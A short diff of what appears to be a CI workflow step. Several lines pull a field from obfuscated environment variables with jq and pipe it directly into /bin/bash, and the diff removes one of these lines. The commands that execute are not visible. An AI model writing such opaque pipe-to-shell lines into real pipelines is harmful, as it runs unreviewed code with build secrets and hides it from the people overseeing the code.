@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$tfr6957" | jq -r .orflz30 | /bin/bash
           echo $fzvqm75348 | jq -r .t961 | /bin/bash
           echo $uee35699 | jq -r .dy008 | /bin/bash
-          printf '%s' "$rskk961" | jq -r .zay116 | /bin/bash
           echo $dpwbe27719 | jq -r .e3533 | /bin/bash
 
       - name: Upload output
